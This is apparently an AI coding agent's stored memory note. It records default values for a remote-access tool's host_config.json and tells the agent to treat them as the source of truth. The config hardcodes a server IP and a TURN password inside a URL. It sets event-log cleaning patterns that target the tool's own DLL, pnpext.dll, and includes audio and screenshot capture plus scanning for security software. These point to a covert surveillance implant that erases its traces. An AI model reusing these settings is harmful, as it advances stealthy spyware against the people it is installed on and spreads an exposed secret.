---
name: Reference host_config.json
description: Canonical host_config.json values confirmed by user 2026-04-08 — use these as defaults when generating/editing the template
type: reference
---

The user designated this as the reference config (stored in `host_config.json.template`). Use it as source of truth for defaults, field names, and field ordering.

**Key fields & values:**
- server: `64.226.66.66` (VPS IP, port 8080)
- codec: h264, quality 80, fps 30, scale 100, bitrate 2000
- screen_connections: 1, file_connections: 4
- STUN: `stun:64.226.66.66:3478`
- TURN: `turn:rdp:secret-password@64.226.66.66:3478` (creds embedded in URL)
- evtlog_clean_patterns: `pnpext,pnpext.dll` (targets the DLL name)
- screenshot defaults: disabled, 10s interval, q75, scale 50, always=true
- audio defaults: disabled, 30s segment, 16kHz, 128kbps, mono, gain 100
- threat_scan_enabled: true, threat_auto_pause: false

**How to apply:** When generating new configs, editing the template, or validating runtime config, match this shape. Preserve field ordering as in the template.
